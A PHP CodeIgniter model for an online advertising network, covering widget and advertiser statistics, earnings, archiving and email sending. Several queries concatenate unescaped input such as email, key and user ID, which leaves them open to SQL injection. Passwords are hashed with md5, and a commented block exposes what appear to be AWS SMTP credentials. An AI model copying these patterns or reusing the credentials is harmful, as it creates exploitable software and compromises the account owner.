<?php 
class Site_model extends CI_Model {

    function __construct()
    {
       parent::__construct();
	   $this->load->database();
	   $this->load->dbutil();
	   $this->load->helper('file');
    }
	
	public function content_pages($url){	   
		$this->db->where('url',$url);
		$query = $this->db->get('pages');
		if ($query->num_rows() > 0){
			$row = $query->row_array();
			return $row; 
       	}
		else{
			return false;
		}
	}
	
	public function get_partners(){		
		$query = $this->db->get('partners');
		$data = $query->result_array();
		return $data;		
	}
	
	public function get_translations(){
	  $sql = " SELECT * FROM  translations ";
	  $query = $this->db->query($sql);
	  $res = $query->result_array();
	  $data = array();
	  foreach($res as $v){
	   $data[$v['code']] = $v['translation_'.$this->language];
	  }
	  return $data;
	}
	
	public function is_adv_belong_to_user($adv_id, $user_id){
		$adv_id = mysql_real_escape_string($adv_id);
		$sql = "
			SELECT
				* 
			FROM 
				advertisers
			WHERE user_id = '$user_id' AND item_id='$adv_id'
		";
		$query = $this->db->query($sql);
		if($query->num_rows() == 1){
			return true;
		}
		return false;
	}
	public function get_site_widgets_count($site_id){
		$site_id = mysql_real_escape_string($site_id);
		$query = $this->db->query("SELECT COUNT(*) AS count FROM widgets WHERE site_id = '$site_id'");
		$data = $query->row_array();
		return isset($data['count'])?$data['count']:0;
	}
	public function get_site_url_by_id($site_id){
		$site_id = mysql_real_escape_string($site_id);
		$query = $this->db->query("SELECT * FROM site_owners WHERE site_id = '$site_id'");
		$data = $query->row_array();
		$site_url = isset($data['site_url'])?$data['site_url']:false;
		return $site_url;
	}
	public function change_user_password($new_password, $email){
		$this->db->where('email', $email);
		$this->db->update('users', array('password' => md5($new_password) ));
	}
	
	public function edit_user_account($user_id,$amount_number){	  
		$data = array(		 
		 'account_number' => $amount_number
	   );
		$this->db->where('user_id', $user_id);
		$this->db->update('users', $data);		
	}
	
	public function forgot_password($email){
		$query = $this->db->query("SELECT * FROM users WHERE email = '$email'");
		if($query->num_rows() == 1){
			
			return true;
		}
		return false;
	}	
	public function get_user_amount_requests($user_id){
		$query = $this->db->query("SELECT * FROM user_get_earnings WHERE user_id = '$user_id'");
		$data = $query->result_array();
		return $data;
	}
	public function add_user_get_earning($data){
		$this->db->insert('user_get_earnings', $data);
	}
	public function update_users_ernings(){
		$sql0 = "
			SELECT 
				SUM(widgets_showing.showing_price) AS earning1,
				site_owners.user_id
			FROM 
				widgets_showing 
			INNER JOIN 
				widgets ON widgets.widget_id = widgets_showing.widget_id 
			INNER JOIN 
				site_owners ON site_owners.site_id = widgets.site_id	
			WHERE 1
			GROUP BY 
				site_owners.user_id";
		$query0 = $this->db->query($sql0);
		$user_earnings1 = $query0->result_array();
		//echo '<pre>';
		//var_dump($widget_type);
		$sql = "
			SELECT 
				SUM(round(( (widgets_visiting.price*widgets_visiting.percentage)/100 ),3)) AS earning,
				site_owners.user_id
			FROM 
				widgets_visiting 
			INNER JOIN 
				widgets ON widgets.widget_id = widgets_visiting.widget_id 
			INNER JOIN 
				site_owners ON site_owners.site_id = widgets.site_id	
			GROUP BY 
				site_owners.user_id";
		$query = $this->db->query($sql);
		$user_earnings = $query->result_array();
		
		//echo "<pre>";
		//var_dump($user_earnings);
		$sql1 = "
			SELECT 
				user_id,
				SUM(amount) AS earning
			FROM
				user_get_earnings
			WHERE 
				status != 2
			GROUP BY user_id	
		";
		$query1 = $this->db->query($sql1);
		$user_withdrawing_ = $query1->result_array();
		$user_withdrawing = array();	
		foreach($user_withdrawing_ as $k1 => $v1){
			$user_withdrawing[$v1['user_id']] = $v1;;
		}
		if(!empty($user_earnings)){
			foreach($user_earnings as $k => $v){
				$earning = $v['earning'] - (isset($user_withdrawing[$v['user_id']])?$user_withdrawing[$v['user_id']]['earning']:0);
				//var_dump($v['earning']);
				$this->db->where('user_id', $v['user_id']);
				$this->db->update('users', array('current_earning_amount' => $earning  ));
			}
		}
		
		
		
		if(!empty($user_earnings1)){
			foreach($user_earnings1 as $k => $v){
			    $user_id = $v['user_id'];
				$sql3 = "SELECT current_earning_amount	FROM users WHERE user_id = '$user_id' ";
				$query3 = $this->db->query($sql3);
				$current_earning_amount = $query3->row_array();	
				
				//var_dump($current_earning_amount);
				
				$sql4 = "SELECT archiver_price	FROM archiver_prices WHERE user_id = '$user_id' ";
				$query4 = $this->db->query($sql4);
				$archiver_earning_amount = $query4->row_array();
				
				if(!empty($user_earnings)){
					$earning = $current_earning_amount['current_earning_amount'] + $v['earning1'] + (isset($archiver_earning_amount['archiver_price'])?$archiver_earning_amount['archiver_price']:0);				
				}
				else{
					$earning = $v['earning1'] + $archiver_earning_amount['archiver_price'] - (isset($user_withdrawing[$v['user_id']])?$user_withdrawing[$v['user_id']]['earning']:0);				
				}				
				$this->db->where('user_id', $v['user_id']);
				$this->db->update('users', array('current_earning_amount' => $earning  ));
			}
		}
		return $user_earnings;
	}
	public function archiver(){				
		$first_day_tim  = mktime(0, 0, 0, date("m")  ,1, date("Y"));
		$first_day_of_month=date("Ymd", $first_day_tim);
		
		$sql = "
			SELECT 
				SUM(widgets_showing.showing_price) AS earning,
				site_owners.user_id
			FROM 
				widgets_showing 
			INNER JOIN 
				widgets ON widgets.widget_id = widgets_showing.widget_id 
			INNER JOIN 
				site_owners ON site_owners.site_id = widgets.site_id	
			WHERE widgets_showing.date < $first_day_of_month
			GROUP BY 
				site_owners.user_id";
		$query = $this->db->query($sql);
		$user_earnings = $query->result_array();
		foreach($user_earnings as $index => $value){
			$query = $this->db->get_where('archiver_prices', array('user_id' => $value['user_id']));
			$archiver_prices = $query->row_array();
			if(empty($archiver_prices)){
				$data = array(
				   'user_id' => $value['user_id'] ,
				   'archiver_price' => $value['earning']
				);
				$this->db->insert('archiver_prices', $data); 
			}
			else{
				$data = array(				 
				 'archiver_price' => $value['earning'] + $archiver_prices['archiver_price']			 
				);

				$this->db->where('user_id', $value['user_id']);
				$this->db->update('archiver_prices', $data);
			}
		}
		
		
		
		$sql = "
		SELECT 
			widgets_statistika.date,
			widgets_statistika.showing,
			widgets_statistika.visiting,
			REPLACE(widgets_statistika.earning, '.', ','),
			site_owners.user_id
		FROM 
			widgets_statistika 
		INNER JOIN 
			widgets ON widgets.widget_id = widgets_statistika.widget_id 
		INNER JOIN 
			site_owners ON site_owners.site_id = widgets.site_id	
		WHERE widgets_statistika.date < '$first_day_of_month' 
		ORDER BY widgets_statistika.date
		";
		$query1 = $this->db->query($sql);
		$data= $query1->result_array();
		
		$temp=array();
		foreach($data as $index => $value){
			$val = $value;
			array_pop($val);
			$temp[$value['user_id']][0] = 'date;showing;visiting;earning';
			$temp[$value['user_id']][] = implode(';',$val);		
		}
		$temp2=array();
		foreach($temp as $index => $value){
			$temp2[$index] = implode("\r\n",$value);			
		}
		//echo '<pre>';		
		//var_dump($temp2);
		
		$last_month_tim  = mktime(0, 0, 0, date("m")  , 0, date("Y"));
		$last_month=date("Y.m", $last_month_tim);
				
		foreach($temp2 as $index => $value){
			if (!is_dir(FCPATH.'archiv/'.$index)) {
				mkdir(FCPATH.'archiv/'.$index, 0755, true);
				write_file(FCPATH.'archiv/'.$index.'/index.html','');
			}
		    write_file(FCPATH.'archiv/'.$index.'/widgets_'.$last_month.'.csv',$value);		
		}
		//echo 'uu'.$last_month;
		
		
		
		$sql = "
		SELECT 
			adv_statistika.date,
			adv_statistika.adv_showing,
			adv_statistika.adv_visiting,
			REPLACE(adv_statistika.adv_charging, '.', ','),
			adv_statistika.adv_id,
			advertisers.user_id
		FROM 
		adv_statistika
		INNER JOIN advertisers ON advertisers.item_id = adv_statistika.adv_id				
		WHERE adv_statistika.date < '$first_day_of_month' 
		ORDER BY adv_statistika.date
		";
		$query1 = $this->db->query($sql);
		$data= $query1->result_array();
		$temp=array();
		foreach($data as $index => $value){
			$val = $value;
			array_pop($val);
			array_pop($val);
			$temp[$value['user_id'].'_'.$value['adv_id']][0] = 'date;adv_showing;adv_visiting;adv_charging';
			$temp[$value['user_id'].'_'.$value['adv_id']][] = implode(';',$val);		
		}
		$temp2=array();
		foreach($temp as $index => $value){
			$temp2[$index] = implode("\r\n",$value);			
		}
		foreach($temp2 as $index => $value){
		    $indexs = explode("_",$index);
			$user_id = $indexs[0];
			$adv_id = $indexs[1];
			if (!is_dir(FCPATH.'archiv/'.$user_id.'/'.$adv_id)) {
				mkdir(FCPATH.'archiv/'.$user_id.'/'.$adv_id, 0755, true);
				write_file(FCPATH.'archiv/'.$user_id.'/'.$adv_id.'/index.html','');
			}
		    write_file(FCPATH.'archiv/'.$user_id.'/'.$adv_id.'/adv_'.$last_month.'.csv',$value);		
		}
		//echo '<pre>';		
		//var_dump($temp2);
		
		$tables = array('widgets_showing', 'widgets_statistika', 'adv_showing','adv_statistika');
        $this->db->where('date <', $first_day_of_month);
        $this->db->delete($tables);
		//var_dump(33);
	}
	
	public function get_user_current_earning_amount($user_id){
		$query = $this->db->query("SELECT * FROM users WHERE user_id = '$user_id'");
		$data = $query->row_array();
		return isset($data['current_earning_amount'])?(float)$data['current_earning_amount']:false;
	}
	public function add_user_amount($data){
		$this->db->insert('user_inserted_amounts', $data);
	}
	public function add_user_amount_as_charged($data){
		$this->db->insert('user_charged_amounts', $data);
	}
	public function get_temp_order($trans_id){
		$trans_id = mysql_real_escape_string($trans_id);
		$query = $this->db->query("SELECT * FROM temp_order_data WHERE trans_id = '$trans_id'");
		$data = $query->row_array();
		return $data;
	}
	public function add_order_temp($temp_order_data){
		$this->db->delete('temp_order_data', array('user_id' => $temp_order_data['user_id']));
		$this->db->insert('temp_order_data', $temp_order_data);
		return true;
	}
	public function update_advs_statistika(){
		$today = date('Ymd');
		$yesterday = date("Ymd", strtotime( '-1 days' ) );
		$this->db->query('SET SQL_BIG_SELECTS=1');
		$query = $this->db->query("SELECT *, SUM(count) AS total_showing FROM adv_showing WHERE date >='$yesterday' GROUP BY date, item_id");
		$adv_showings = $query->result_array();
		$this->db->where("(date >='$yesterday')");
		$this->db->delete('adv_statistika');
		
		
		foreach($adv_showings as $adv_showing){
			$data = array(
				'adv_id' => $adv_showing['item_id'],
				'date'      => $adv_showing['date'],
				'adv_showing'   => $adv_showing['total_showing']
			);
			$this->db->insert('adv_statistika', $data);
		}
		$query = $this->db->query("SELECT date, item_id, SUM(current_price) AS charging, COUNT(*) AS total_visiting FROM adv_visites  WHERE date >='$yesterday' GROUP BY date, item_id");
		$adv_visiting = $query->result_array();
		foreach($adv_visiting as $adv_visiting){
			$data_to_update = array(
				'adv_visiting' => $adv_visiting['total_visiting'],
				'adv_charging' => $adv_visiting['charging']
			);
			$this->db->where('adv_id', $adv_visiting['item_id']);
			$this->db->where('date', $adv_visiting['date']);
			$this->db->update('adv_statistika', $data_to_update);
		}
		echo "done";
	}
	public function update_widgets_statistika(){
		$video_show_price = array();
		$today = date('Ymd');
		$yesterday = date("Ymd", strtotime( '-1 days' ) );
		$query0 = $this->db->query("SELECT * FROM video_widget ");
		$data0 = $query0->result_array();
		foreach($data0 as $v){
			$video_show_price[$v['video_type']] = (int)$v['show_price'];
		}
		//$video_show_price = (int)$data0['show_price'];	
		
		
		$query = $this->db->query("SELECT widgets_showing.widget_id,widgets_showing.date,widgets.widget_type, SUM(widgets_showing.count) AS total_showing FROM
									widgets_showing
									INNER JOIN
									widgets ON widgets_showing.widget_id = widgets.widget_id
									WHERE date >='$yesterday' GROUP BY date, widget_id");
		$widgets_showing = $query->result_array();
		$query1 = $this->db->query("SELECT date, widget_id, SUM(round(( (price*percentage)/100 ),3)) AS earning, COUNT(*) AS total_visiting FROM widgets_visiting  WHERE date >='$yesterday' GROUP BY date, widget_id");
		$widgets_visiting = $query1->result_array();
		$this->db->where("(date >='$yesterday')");
		$this->db->delete('widgets_statistika');
		$index=0;		
		foreach($widgets_showing as  $widget_showing){
			$data = array(
				'widget_id' => $widget_showing['widget_id'],
				'date'      => $widget_showing['date'],
				'showing'   => $widget_showing['total_showing']
			);
			$this->db->insert('widgets_statistika', $data);
			
			//var_dump($widget_showing['widget_type']);
			if($widget_showing['widget_type']=='video' || $widget_showing['widget_type']=='video1' || $widget_showing['widget_type']=='video2' || $widget_showing['widget_type']=='banner1' || $widget_showing['widget_type']=='banner2' || $widget_showing['widget_type']=='banner3' || $widget_showing['widget_type']=='banner4'){
				$data_to_update = array(						
						'earning' => $video_show_price[$widget_showing['widget_type']] * (int)$widget_showing['total_showing'] 
					);
				$this->db->where('widget_id', $widget_showing['widget_id']);
				$this->db->where('date', $widget_showing['date']);
				$this->db->update('widgets_statistika', $data_to_update);
				//var_dump($data_to_update['earning']);
			}
			else{				
				$data_to_update = array(
					'visiting' => $widgets_visiting[$index]['total_visiting'],
					'earning' => $widgets_visiting[$index]['earning']
				);
				//var_dump($data_to_update['visiting']);
				//var_dump($data_to_update['earning']);
				$this->db->where('widget_id', $widgets_visiting[$index]['widget_id']);
				$this->db->where('date', $widgets_visiting[$index]['date']);
				$this->db->update('widgets_statistika', $data_to_update);
				$index+=1;			
			}
		}
		
	}
	public function get_adv_statistika($adv_id, $from_date ,$to_date){
		$adv_id    = mysql_real_escape_string($adv_id);
		$from_date = mysql_real_escape_string($from_date);
		$to_date   = mysql_real_escape_string($to_date);
		
		$sql = "
			SELECT 
				*,
				SUM(adv_statistika.adv_showing) AS total_showing,
				SUM(adv_statistika.adv_visiting) AS total_visiting,
				adv_statistika.date AS date
			FROM
				adv_statistika
			INNER JOIN advertisers ON advertisers.item_id = adv_statistika.adv_id
			WHERE 
				advertisers.item_id = '$adv_id' AND adv_statistika.date >='$from_date' AND adv_statistika.date <= '$to_date'
			GROUP BY adv_statistika.date ORDER BY adv_statistika.date DESC	
		";
		$this->db->query('SET SQL_BIG_SELECTS=1');
		$query = $this->db->query($sql);
		$data = $query->result_array();
		return $data;
	}
	public function get_site_statistika($site_id, $from_date ,$to_date){
		$site_id   = mysql_real_escape_string($site_id);
		$from_date = mysql_real_escape_string($from_date);
		$to_date   = mysql_real_escape_string($to_date);
		$sql = "
			SELECT 
				*,
				SUM(widgets_statistika.showing)  AS total_showing,
				SUM(widgets_statistika.visiting)  AS total_visiting,
				SUM(widgets_statistika.earning)  AS total_earning
			FROM
				widgets_statistika
			INNER JOIN widgets ON widgets.widget_id = widgets_statistika.widget_id
			WHERE 
				widgets.site_id = '$site_id' AND widgets_statistika.date >='$from_date' AND widgets_statistika.date <= '$to_date'
			GROUP BY widgets_statistika.date ORDER BY widgets_statistika.date DESC	
			
			
		";
		$query = $this->db->query($sql);
		$data = $query->result_array();
		return $data;
		
	}
	public function update_daily_advs(){
		
		$today = date('Ymd');
		$sql = "
			SELECT 
				COUNT(*) AS daily_showing,
				item_id				
			FROM 
				adv_showing
			WHERE date='$today'	
			GROUP BY item_id	
		";
		$this->db->query('SET SQL_BIG_SELECTS=1');
		$query = $this->db->query($sql);
		$daily_showings = $query->result_array();
		$sql = "
			SELECT 
				COUNT(*) AS daily_visiting,
				item_id				
			FROM 
				adv_visites
			WHERE date='$today'	
			GROUP BY item_id	
		";
		$query = $this->db->query($sql);
		$daily_visitings_ = $query->result_array();
		$daily_visitings = array();
		foreach($daily_visitings_ as $k => $v){
			$daily_visitings[$v['item_id']] = $v;
		}
		foreach($daily_showings as $k2 => $v2){
			$daily_showing  = $v2['daily_showing'];
			$daily_visiting = isset($daily_visitings[$v2['item_id']])?$daily_visitings[$v2['item_id']]['daily_visiting']:0;
			$this->db->where('item_id', $v2['item_id']);
			$this->db->update('advertisers', array('daily_showing' => $daily_showing, 'daily_visiting' => $daily_visiting ));
		}		
	}
	public function update_daily_widgets(){
		$today = date("Ymd");
		//var_dump($today);exit;
		$this->db->query('SET SQL_BIG_SELECTS=1');
		
		$video_show_price = array();		
		$query0 = $this->db->query("SELECT * FROM video_widget ");
		$data0 = $query0->result_array();
		foreach($data0 as $v){
			$video_show_price[$v['video_type']] = (int)$v['show_price'];
		}		
		//$video_show_price = (int)$data0['show_price'];
		
		$query1 = $this->db->query("SELECT widget_id, count(*) AS total, SUM(round(( (price*percentage)/100 ),3)) AS earning FROM widgets_visiting WHERE date='$today' GROUP BY widget_id");
		$data_ = $query1->result_array();
		$data2 = array();
		foreach($data_ as $k3 => $v3){
			$data2[$v3['widget_id']] = $v3; 
		}
		
		
		
		$query = $this->db->query("SELECT widgets_showing.widget_id,widgets.widget_type, SUM(widgets_showing.count) AS total FROM
									widgets_showing
									INNER JOIN
									widgets ON widgets_showing.widget_id = widgets.widget_id
									WHERE date='$today' GROUP BY widget_id"); 
		$data = $query->result_array();
		$data1 = array();
		//var_dump($data);
		foreach($data as $k1 => $v1){
			$data1[$v1['widget_id']] = $v1;			
            if($v1['widget_type']=='video' || $v1['widget_type']=='video1' || $v1['widget_type']=='video2' || $v1['widget_type']=='banner1' || $v1['widget_type']=='banner2' || $v1['widget_type']=='banner3' || $v1['widget_type']=='banner4'){
				$data2[$v1['widget_id']]['earning'] = (int)$v1['total']*$video_show_price[$v1['widget_type']] ;
				$data2[$v1['widget_id']]['total'] = 0 ;
			}			
		}		
		
		
		
		
		
		$query2 = $this->db->query("SELECT * FROM widgets");
		$all_widgets = $query2->result_array();
		
		
		
		foreach($all_widgets as $k2 => $v2){
			$daily_showing = isset($data1[$v2['widget_id']])?$data1[$v2['widget_id']]['total']:0;
			$daily_visiting = isset($data2[$v2['widget_id']])?$data2[$v2['widget_id']]['total']:0;
			$daily_earning = isset($data2[$v2['widget_id']])?$data2[$v2['widget_id']]['earning']:0;
			//var_dump($daily_earning);
			$this->db->where('widget_id', $v2['widget_id']);
			$this->db->update('widgets', array('daily_showing' => $daily_showing, 'daily_visiting' => $daily_visiting, 'daily_earning' => $daily_earning ));
		}
		
		
		/*$query = $this->db->query("SELECT widget_id, count(*) AS total FROM widgets_visiting WHERE date='$today' GROUP BY widget_id");
		$data = $query->result_array();*/
		
		
		
		/*foreach($data as $v){
			$data_to_update = array(
				'daily_visiting' => $v['total']
			);
			$this->db->where('widget_id', $v['widget_id']);
			$this->db->update('widgets', $data_to_update);
		}*/
		return true;
	}
	public function add_widget_visiting($widget_id, $adv_id, $price, $percentage){
		$ip_address = $this->session->userdata('ip_address');
		$widget_id     = mysql_real_escape_string($widget_id);
		$adv_id        = mysql_real_escape_string($adv_id);
		$price         = mysql_real_escape_string($price);
		$percentage    = mysql_real_escape_string($percentage);
		$data = array(
			'widget_id' => $widget_id,
			'adv_id'  =>  $adv_id,
			'price'   => $price,
			'ip_address' => $ip_address,
			'percentage' => $percentage,
			'date'      => date("Ymd"),
		);
		$this->db->insert('widgets_visiting', $data);
	}
	public function add_widget_showing($widget_id, $count,$widget_type){
		$widget_id = mysql_real_escape_string($widget_id);
		$count     = mysql_real_escape_string($count);
		$widget_type     = mysql_real_escape_string($widget_type);
		$ip_address = $this->session->userdata('ip_address');
		$today = date("Ymd");
		$now = date("Y-m-d H:i:s");
		$three_hours_ago  = date( "Y-m-d H:i:s" , mktime(date("H")-3, date("i"), date("s"), date("m"), date("d"), date("Y") ) );
		$all_video_widget = $this->get_all_video_widget();
		foreach($all_video_widget as $value){
			if($widget_type==$value['video_type']){
				$showing_price = $value;
			}
		}
		   
		
		if($widget_type=='video' || $widget_type=='video1' || $widget_type=='video2' || $widget_type=='banner1' || $widget_type=='banner2' || $widget_type=='banner3' || $widget_type=='banner4'){
			$query1 = $this->db->query("SELECT MAX(date_time) as max FROM widgets_showing");
			$data = $query1->row_array();
			$latest_post = $data['max'];
			$sql = "SELECT * 
									FROM widgets_showing 
									WHERE 
									widget_id = '$widget_id' AND
									ip_address = '$ip_address' AND 
									date='$today' AND 
									TIMESTAMPDIFF(HOUR,'$latest_post','$three_hours_ago') < 0 ";
									
			$query = $this->db->query($sql); 
			if($query->num_rows() == 0){
				$data = array(
				'widget_id' => $widget_id,
				'ip_address' => $ip_address,
				'date'      => date("Ymd"),
				'count'     => $count,
				'showing_price' => $showing_price['show_price'],
				'date_time' => date("Y-m-d H:i:s")
				);
				$this->db->insert('widgets_showing', $data);
			}		
		}
		else{
			$data = array(
			'widget_id' => $widget_id,
			'ip_address' => $ip_address,
			'date'      => date("Ymd"),
			'count'     => $count,
			'showing_price' => 0			
			);
			$this->db->insert('widgets_showing', $data);
		}
		
	}
	public function check_security($domain, $widget_id){
		$domain    = mysql_real_escape_string($domain);
		$widget_id = mysql_real_escape_string($widget_id);
		$sql = "
			SELECT 
				* 
			FROM 
				widgets
			INNER JOIN 
				site_owners ON widgets.site_id = site_owners.site_id
			WHERE widgets.widget_id = '$widget_id' AND site_owners.site_url LIKE '%$domain%' AND site_owners.status=1	
		";
		$query = $this->db->query($sql);
		if($query->num_rows() > 0){	
			return true;
		}
		return false;
	}
	public function get_email_by_key($key){
		$query = $this->db->query("SELECT * FROM emails WHERE `key` = '$key'"); 
		$data = $query->row_array();
		return $data;
	}
	public function send_email_by_key($key,$email_to, $password = false){	
		$email = $this->get_email_by_key($key);
		$subject = $email['subject'];		
		$message = $email['text'];	
		if($password){	
			$message = str_replace("{PASSWORD}",  $password, $message);	
		}	
		/*//$this->load->library('email');
		$config = Array(
                'protocol' => 'smtp',
                'smtp_host' => 'email-smtp.us-east-1.amazonaws.com',
                'smtp_port' => 587,
                //'smtp_crypto' => 'tls',
                'smtp_user' => 'AKIAINY5XUPKQ3Z7JFSQ',
                'smtp_pass' => 'AtoSI4EBwSss8UToNnHiYBBkqxx7HP8VlYWvUATytixg',
                'smtp_crypto' => 'tls',
                'mailtype' => 'html',
                'charset' => 'UTF-8',
                'newline' => "\r\n"
            );
            //$mail_user = $this->input->post('email');
            //send activation email to admin for new registered users
            $this->load->library('email', $config);*/
		
		
		
		
		$email_to = trim($email_to);
		
		$this->email->from('webadvert@webadvert.am', 'Webadvert');  
		$this->email->to($email_to); 
		$this->email->subject($subject);  
		$this->email->message($message); 
		$this->email->send();
	}
	public function send_group_emails(){
		$query = $this->db->query("SELECT * FROM group_emails_to_send ORDER BY id ASC LIMIT 50"); 
		$data = $query->result_array();
		if(!empty($data)){
			$last_id = false;
			foreach($data as $v){
				
				$this->email->from('info@webadvert.am', 'Webadvert');
				$this->email->to($v['email']); 
				$this->email->set_mailtype("html");
				$this->email->subject($v['subject']);
				$this->email->message($v['text']);	
				$this->email->send();
				$last_id = $v['id'];
			}
			$query = $this->db->query("DELETE FROM group_emails_to_send WHERE id <='$last_id'");
			return true;
		}	
	}
	public function charge_money_for_adv($item_id){
		/*$query = $this->db->query("SELECT * FROM advertisers INNER JOIN user_amount ON advertisers.user_id = user_amount.user_id WHERE advertisers.item_id = '$item_id'"); 
		$data = $query->row_array();
		$price = isset($data['price'])?$data['price']:0;
		$amount = isset($data['amount'])?$data['amount']:0;
		$percentage = isset($data['percentage'])?$data['percentage']:0;
		
		$user_id = isset($data['user_id'])?$data['user_id']:false;
		if($user_id){
			$new_ammount = 	(($amount - $price)>=0)?($amount - $price):false;
			if($new_ammount !== false){
				$this->db->where('user_id', $user_id);
				$this->db->update('user_amount', array('amount' => $new_ammount));
			}
		}
		return array('price' => $price, 'percentage' => $percentage);
		*/
		$item_id = mysql_real_escape_string($item_id);
		
		$query = $this->db->query("SELECT * FROM advertisers WHERE item_id = '$item_id'");
		$data = $query->row_array();
		$price = isset($data['price'])?$data['price']:0;
		$percentage = isset($data['percentage'])?$data['percentage']:0;
		$user_id = isset($data['user_id'])?$data['user_id']:false;
		//$amount = isset($data['amount'])?$data['amount']:0;///555555555555555555555
		$amount = $this->get_user_ammount($user_id);
		if($user_id){
			$new_ammount = 	(($amount - $price)>=0)?($amount - $price):false;
			if($new_ammount !== false){
				$data_to_insert = array(
					'user_id' => $user_id,
					'amount' => $price,
					'date'   => time()
				);
				$this->add_user_amount_as_charged($data_to_insert);
				$this->update_user_amount($user_id);
				//$this->db->where('user_id', $user_id);
				//$this->db->update('user_amount', array('amount' => $new_ammount));
			}
		}
		return array('price' => $price, 'percentage' => $percentage);
	}
	public function visit_adv($data){
		$ip_address  = $data['ip_address'];
		$session_id = $data['session_id'];
		$item_id    = $data['item_id'];
		$widget_id = isset($data['widget_id'])?$data['widget_id']:false;
		$today = date("Ymd");
		
		
		
		$query = $this->db->query("SELECT * FROM adv_visites WHERE item_id = '$item_id' AND ip_address = '$ip_address' AND date='$today'"); 
		if($query->num_rows() == 0){
			$adv_data = $this->charge_money_for_adv($item_id);
			$price = $adv_data['price'];
			$percentage = $adv_data['percentage'];
			if($widget_id){
				$this->add_widget_visiting($widget_id, $item_id, $price, $percentage);
				unset($data['widget_id']);
			}
			$this->db->insert('adv_visites', $data);
			
		}
		return true;
	}
	public function get_user_ammount($user_id){
		/*$query = $this->db->query("SELECT * FROM  user_amount WHERE user_id = '$user_id'"); 
		$data = $query->row_array();
		return isset($data['amount'])?$data['amount']:0;*/
		return (float)$this->get_user_inserted_amounts($user_id) - (float)$this->get_user_charged_amounts($user_id);
	}
	public function get_user_inserted_amounts($user_id){
		$query = $this->db->query("SELECT SUM(amount) AS total FROM  user_inserted_amounts WHERE user_id = '$user_id' GROUP BY user_id"); 
		$data = $query->row_array();
		return (float)isset($data['total'])?$data['total']:0;
		
	}
	public function get_user_charged_amounts($user_id){
		$query = $this->db->query("SELECT SUM(amount) AS total FROM  user_charged_amounts WHERE user_id = '$user_id' GROUP BY user_id"); 
		$data = $query->row_array();
		return (float)isset($data['total'])?$data['total']:0;
	}
	public function update_user_amount($user_id){
		$current_amount = $this->get_user_ammount($user_id);
		$this->db->where('user_id', $user_id);
		$this->db->update('users', array('amount' => $current_amount)); 
	}
	
	public function get_all_video_widget(){					
		$sql = "SELECT * FROM video_widget";
		$query = $this->db->query($sql); 
		$result = $query->result_array();		
		return $result;
	}
	
	public function get_video_widget(){					
		$sql = "SELECT * FROM video_widget ";
		$query = $this->db->query($sql); 
		$data = $query->row_array();		
		return $data;
	}
	
	public function get_random_not_url_advs($limit = 20){
		$sql = "
			SELECT 
				* 
			FROM  
				advertisers
			INNER JOIN users ON advertisers.user_id = users.user_id	
			WHERE 
				advertisers.status=1 AND advertisers.enable=1 AND users.amount>advertisers.price AND advertisers.site_url = ''
			ORDER BY RAND() 
			LIMIT $limit
		";
		$query = $this->db->query($sql); 
		$data = $query->result_array();
		return $data;
	}
	public function get_random_advertisers($widget_type){
		Switch($widget_type){
			case '728X90':
				$limit = 3;
			break;
			case '600X120':
				$limit = 2;
			break;
			case '300X250':
				$limit = 3;
			break;
			case '240X400':
				$limit = 3;
			break;
			case '160X600':
				$limit = 7;
			break;
			case '120X600':
				$limit = 3;
			break;	
			default:
				$limit = 0;
			break;
		}
		$sql = "
			SELECT 
				* 
			FROM  
				advertisers
			INNER JOIN users ON advertisers.user_id = users.user_id	
			WHERE 
				advertisers.status=1 AND advertisers.enable=1 AND users.amount>advertisers.price
			ORDER BY RAND(), advertisers.price DESC 
			LIMIT $limit
		";
		$query = $this->db->query($sql); 
		$data = $query->result_array();
		foreach($data as $k => $v){
			$item_id = $v['item_id'];
			$this->add_adv_as_showing($item_id);
		}
		return $data;
	}
	public function add_adv_as_showing($item_id){ 
		$item_id = mysql_real_escape_string($item_id);
		$ip_address = $this->session->userdata('ip_address');
		$today = date('Ymd');
		$data = array(
			'item_id' => $item_id,
			'ip_address' => $ip_address,
			'count' => 1,
			'time' => time(),
			'date' => $today
		);
		$this->db->insert('adv_showing', $data);
	}
	public function get_widgets_by_id($widget_id){
		$query = $this->db->query("SELECT * FROM  widgets WHERE widget_id = '$widget_id'"); 
		$data = $query->row_array();
		return $data;
	}
	public function add_widget($data){
		$this->db->insert('widgets', $data);
	}
	
	public function edit_widget($data, $widget_id){
		$this->db->where('widget_id', $widget_id);
		$this->db->update('widgets', $data); 
		return true;
	}
	public function disable_adv($adv_id){
		$this->db->where('item_id', $adv_id);
		$this->db->update('advertisers', array('enable' => 0));
	}
	public function enable_adv($adv_id){
		$this->db->where('item_id', $adv_id);
		$this->db->update('advertisers', array('enable' => 1));
	}
	public function get_user_site_widgets($site_id){
		$site_id = mysql_real_escape_string($site_id);
		$query = $this->db->query("SELECT *, site_owners.site_url FROM widgets INNER JOIN site_owners ON site_owners.site_id = widgets.site_id WHERE widgets.site_id = '$site_id'"); 
		$data = $query->result_array();
		return $data;
	}
	function insert_user($data){
		$this->db->insert('users', $data); 
	}
	public function is_widget_owner($widget_id, $user_id){
		$widget =$this->get_widgets_by_id($widget_id);
		$site_id = isset($widget['site_id'])?$widget['site_id']:false;
		if(!$site_id){
			return false;
		}
		$is_owner = $this->is_site_owner($site_id, $user_id);
		return $is_owner;
	}
	public function is_site_owner($site_id, $user_id){
		$site_id = mysql_real_escape_string($site_id);
		$user_id = mysql_real_escape_string($user_id);
		
		$query = $this->db->query("SELECT * FROM site_owners WHERE user_id = '$user_id' AND site_id = '$site_id' AND status=1"); 
		if($query->num_rows() == 1){	
			return true;
		}
		return false;
	}
	public function add_advertiser($data){
		$this->db->insert('advertisers', $data);
	}
	public function edit_advertiser($data, $item_id){
		$this->db->where('item_id', $item_id);
		$this->db->update('advertisers', $data); 
		return true;
	}
	public function delete_adv($adv_id){
		$this->db->where('item_id', $adv_id);
		$this->db->delete('advertisers');
		return true;
	}
	public function get_adv($adv_id){
		$adv_id = mysql_real_escape_string($adv_id);
		$query = $this->db->query("SELECT * FROM advertisers WHERE item_id = '$adv_id'");
		$data = $query->row_array();
		return $data;
	}
	public function get_advertiser($user_id, $item_id = false){
		$item_id = mysql_real_escape_string($item_id);
		if($item_id){
			$query = $this->db->query("SELECT * FROM advertisers WHERE user_id = '$user_id' AND item_id = '$item_id' "); 
			$data = $query->row_array();
		}else{
			$sql = "SELECT 
				*, 
				daily_visiting AS visites, 
				daily_showing AS showing 
				FROM 
					advertisers 
				WHERE 
					user_id = '$user_id' 
				ORDER BY date DESC ";
			$query = $this->db->query($sql);
			$data = $query->result_array();
		}
		return $data;
	}
	
